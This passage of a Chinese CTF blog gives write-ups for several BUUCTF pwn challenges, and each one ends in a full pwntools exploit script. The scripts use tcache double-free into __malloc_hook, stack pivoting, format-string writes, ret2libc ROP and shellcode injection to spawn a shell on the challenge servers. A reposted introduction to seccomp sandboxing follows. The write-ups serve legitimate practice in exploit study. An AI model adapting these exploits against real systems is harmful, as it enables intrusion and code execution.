<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203604.png"></p>
<p>这是第二次申请，只剩下chunk0，那第三次申请就能让chunk出现在chunk0位置，然后修改其size的大小，这边我是修改为0x420</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203733.png"></p>
<p>然后把这个堆块释放掉，就会出现libc了，这边解释为什么要申请很多的堆块，因为你要修改为0x420，如果申请的堆块没有大于0x420，那这个堆块会一直处于free的状态的，他要有那么大的size，才能成为0x420的chunk，所以我们申请的堆块会先被并入这个大chunk里面。</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505204038.png"></p>
<p>释放完后出现了libc中的地址，接下来就泄露了。因为题目里面只能泄露出堆块的地址，所以我们要想办法让在这个地址申请chunk。这边因为这个0x420的chunk是由许多chunk合并的，我们把chunk1释放了，再申请一个大小和chunk0一样的堆块，就可以让chunk1能够重叠在fd的位置</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505204421.png"></p>
<p>可以看到，0x20大小的tcache_entry出现了类似前面的重复释放的样式，所以也是申请堆块，然后在libc地址生成chunk，再将其泄露。之后就是劫持hook了，以上的就是这题的点了，后面不多说了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25609</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,write</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;something&quot;</span>,write)<br>	p.recvuntil(<span class="hljs-string">&quot;gift :&quot;</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>ptr0=add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ptr0)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#4</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#5 </span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#6</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#7 </span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#9 </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#10</span><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#11</span><br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<span class="hljs-comment">#12</span><br><br>remove(<span class="hljs-number">12</span>)<br>remove(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x20</span>,p64(ptr0-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>))<br>remove(<span class="hljs-number">0</span>)<br>remove(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>libc_base=add(<span class="hljs-number">18</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;x&#x27;</span>)-<span class="hljs-number">0x3ebca0</span><br>__malloc_hook=libc_base+__malloc_hook<br>one_gadget=libc_base+<span class="hljs-number">0x10a38c</span><br>log.info(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>log.info(<span class="hljs-string">&quot;__malloc_hook: &quot;</span>+<span class="hljs-built_in">hex</span>(__malloc_hook))<br>log.info(<span class="hljs-string">&quot;one_gadget: &quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br>remove(<span class="hljs-number">3</span>)<br>remove(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x70</span>,p64(__malloc_hook))<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x70</span>,p64(one_gadget))<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b*main&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index&quot;</span>,<span class="hljs-string">&#x27;22&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-string">&#x27;0x30&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十九、ciscn-2019-s-4"><a href="#十九、ciscn-2019-s-4" class="headerlink" title="十九、ciscn_2019_s_4"></a>十九、ciscn_2019_s_4</h3><p>这题好像之前有过？所以这里就不再多说了，栈迁移的题目，直接贴exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29292</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;beef&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;beef&quot;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br>payload=(<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">1</span>)+p32(s_buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十、jarvisoj-fm"><a href="#二十、jarvisoj-fm" class="headerlink" title="二十、jarvisoj_fm"></a>二十、jarvisoj_fm</h3><p>一道很平常的格式化字符串的题目，就直接给exp了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25092</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>x=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x)+<span class="hljs-string">&#x27;%11$n&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十一、-HarekazeCTF2019-baby-rop2"><a href="#二十一、-HarekazeCTF2019-baby-rop2" class="headerlink" title="二十一、[HarekazeCTF2019]baby_rop2"></a>二十一、[HarekazeCTF2019]baby_rop2</h3><p>一道常规rop题目，除了这题printf会出现下图的匹配不到libc之外，其他没什么，而对于这个，只要换个函数，我这边用read，就可以了。噢，还有！目录里面没有flag</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210506220516.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26933</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400733</span><br>ret=<span class="hljs-number">0x4004d1</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&#x27;name? &#x27;</span>,payload)<br>p.recvline()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十二、ez-pz-hackover-2016"><a href="#二十二、ez-pz-hackover-2016" class="headerlink" title="二十二、ez_pz_hackover_2016"></a>二十二、ez_pz_hackover_2016</h3><p>常规checksec一下，查看保护机制</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091010.png"></p>
<p>nx都没开，应该是注入shellcode来getshell了，进入ida看看代码</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091119.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091125.png"></p>
<p>确实，没给后门函数，nx没开，应该就是注入shellcode了，我们看看代码，首先题目先把s的在栈上的地址泄露出来了，后面则需要绕过crashme，这个简单，先输入这个，加上\x00让strcmp检验通过，之后，在vuln里面的memcpy存在着溢出，里面的栈比较小，而外面的栈较大，可以写入shellcode，接下就计算shellcode的地址，以及溢出点的偏移距离，这边有坑的就是IDA里面的偏移是错的，我们需要进入gdb动调试进行找寻地址以及偏移距离</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091757.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091821.png"></p>
<p>我们泄露的地址距离字符串起始地址0xffc445f0相减之后，相差0x1c</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509092023.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509092054.png"></p>
<p>垃圾字符串偏移是18，但是我们还输入了crashme\x00，所以总的偏移是26个。之后就是return to shellcode了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,29815)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>s_buf=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(s_buf)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">&quot;crashme\x00&quot;</span>.ljust(<span class="hljs-number">26</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf-<span class="hljs-number">0x1c</span>)+shellcode<br>p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十三、-Black-Watch-入群题-PWN"><a href="#二十三、-Black-Watch-入群题-PWN" class="headerlink" title="二十三、[Black Watch 入群题]PWN"></a>二十三、[Black Watch 入群题]PWN</h3><p>常规checksec一下</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509171725.png"></p>
<p>只开启了nx保护，进入ida看看代码</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509171818.png"></p>
<p>给了两次输入，第一次在.bss段上，第二次是栈，栈上的只够覆盖到返回地址，但是.bss却可以输入大量数据，所以要劫持栈到.bss进行rop，所以要让ebp的值为s的地址，返回地址为leave，把栈劫持到.bss上，其他剩下就是常规的rop</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26260</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>leave_ret=<span class="hljs-number">0x8048408</span><br>s_buf=<span class="hljs-number">0x0804A300</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>,payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(write)<br>libc=LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(system)+p32(main)+p32(binsh)<br>p.recv()<br>p.send(payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.recv()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="二十四、jarvisoj-tell-me-something"><a href="#二十四、jarvisoj-tell-me-something" class="headerlink" title="二十四、jarvisoj_tell_me_something"></a>二十四、jarvisoj_tell_me_something</h3><p>这题，进入ida里面</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509174709.png"></p>
<p>有个这个函数，可以看见，已经读取了flag，并且还会将其输出，并且main函数有溢出点，跳转到这，再接收flag即可</p>
<p>exp：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote(&#x27;node3.buuoj.cn&#x27;,28478)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x88+p64(0x400620)<br>p.sendlineafter(<span class="hljs-string">&quot;message:&quot;</span>,payload)<br>p.recvline()<br>p.recvall()<br></code></pre></td></tr></table></figure>

<h3 id="二十五、gwctf-2019-easy-pwn"><a href="#二十五、gwctf-2019-easy-pwn" class="headerlink" title="二十五、gwctf_2019_easy_pwn"></a>二十五、gwctf_2019_easy_pwn</h3><p>照例checksec</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509181618.png"></p>
<p>只开启了nx，进入ida发现是c++写的，看不懂。。。</p>
<img src="/2021/05/05/2021-05-05-buu04/QQ图片20210509181725.png" style="zoom:80%;">

<p>直接输入是不够溢出的，然后往下看，发现还有个strcpy，可能可以溢出，但是v4不知道咋来的，然后就跑去百度了（真没志气，hh），发现其实能看懂应该很简单，不过可能就是为了让人看不懂吧，嗯，应该要学c++了！（下次一定）</p>
<p>这边是I可以被替换为pretty，所以填入I，被转换溢出，而跳转进行rop</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509181629.png"></p>
<p>明白这个，其他也就没什么了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26014</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=<span class="hljs-number">0x8049091</span><br><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(puts_plt)+p32(main)+p32(puts_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;pretty&#x27;</span>*<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">12</span>)<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>one_gadget=puts-<span class="hljs-number">0x05f140</span>+<span class="hljs-number">0x5f066</span><br><span class="hljs-comment">#system=puts-0x24800</span><br><span class="hljs-comment">#binsh=puts+0xf9eeb</span><br><span class="hljs-comment">#payload=&#x27;I&#x27;*16+p32(system)+&#x27;dead&#x27;+p32(binsh)</span><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(one_gadget)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>初探沙箱———转载</title>
    <url>/2021/04/29/2021-04-29-%E5%88%9D%E6%8E%A2%E6%B2%99%E7%AE%B1%E2%80%94%E2%80%94%E2%80%94%E8%BD%AC%E8%BD%BD/</url>
    <content><![CDATA[<p><strong>z转载自<a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/">Tiegu’s Blog</a></strong></p>
<h1 id="沙箱机制初探"><a href="#沙箱机制初探" class="headerlink" title="沙箱机制初探"></a>沙箱机制初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前做题遇到过几次关于沙箱的题目，自己都是靠猜或者是去网上找一些零碎的知识去做的，现在刷buu发现一道关于沙箱机制的题目，加之最近觉得没写博客感觉很多知识点忘得很快，所以打算学习一下沙箱机制，顺便写一篇博客去记录一下。</p>
<h2 id="what’s-the-沙箱安全机制"><a href="#what’s-the-沙箱安全机制" class="headerlink" title="what’s the 沙箱安全机制"></a>what’s the 沙箱安全机制</h2><p>在计算机安全领域，沙箱(Sandbox)是一种程序的隔离运行机制，其目的是限制不可信进程或不可信代码运行时的访问权限。沙箱技术经常被用于执行未经测试的或不可信的客户程序。为了阻止不可信程序可能破坏系统程序或破坏其它用户程序的运行，沙箱技术通过为不可信客户程序提供虚拟化的内存、文件系统、网络等资源，而这种虚拟化手段对客户程序来说是透明的。由于沙箱里的资源被虚拟化（或被间接化），所以沙箱里的不可信程序的恶意行为可以被限制在沙箱中，或者在沙箱里只允许执行在白名单里规定的有限的API操作。</p>
<p><strong>看概念感觉沙箱机制是一种安全隔离技术，但是个人感觉目前做pwn题遇到的沙箱机制用到的是对于一些system call的调用的ban，所以以下介绍的不是对这个沙箱机制的深入了解，而是介绍两种常见的沙箱 seccomp 安全机制和 prctl 。</strong></p>
<h2 id="seccomp的探索"><a href="#seccomp的探索" class="headerlink" title="seccomp的探索"></a><code>seccomp</code>的探索</h2><h3 id="What-is-seccomp"><a href="#What-is-seccomp" class="headerlink" title="What is seccomp"></a>What is seccomp</h3><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. It was merged into the Linux kernel mainline in kernel version 2.6.12, which was released on March 8, 2005. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><p>这里主要介绍几个函数以及利用。</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><span class="image-caption">img</span></a></strong></p>
<p><code>ctx</code>是<code>Filter context/handle</code>,其中<code>typedef void *scmp_filter_ctx;</code><br><code>seccomp_init</code>是初始化的过滤状态,这里用的是<code>SCMP_ACT_ALLOW</code>,表示默认允许所有的syscacll.如果初始化状态为<code>SCMP_ACT_KILL</code>,则表示默认不允许所有的syscall （详见下图）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seccomp actions</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kill the process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Throw a SIGSYS signal</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the specified error code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Notify a tracing process with the specified value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed after the action has been logged</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span><br></code></pre></td></tr></table></figure>

<p><code>seccomp_rule_add</code>是添加一条规则,函数原形如下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>, <span class="hljs-params">uint32_t</span> <span class="hljs-params">action</span>, <span class="hljs-params">int</span> <span class="hljs-params">syscall</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">int</span> <span class="hljs-params">arg_cnt</span>, <span class="hljs-operator">...</span>)</span>;<br></code></pre></td></tr></table></figure>

<p><code>seccomp_load</code>是应用过滤,如果不调用<code>seccomp_load</code>则上面所有的过滤都不会生效</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_load(<span class="hljs-params">const</span> <span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>有一点需要再说一下,我们用的是<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code>,<code>arg_cnt</code>为0,表示我们直接限制execve,不管他什么参数.</p>
<p>如果<code>arg_cnt</code>不为0,那<code>arg_cnt</code>表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截syscall.（参数详情参见下图）</p>
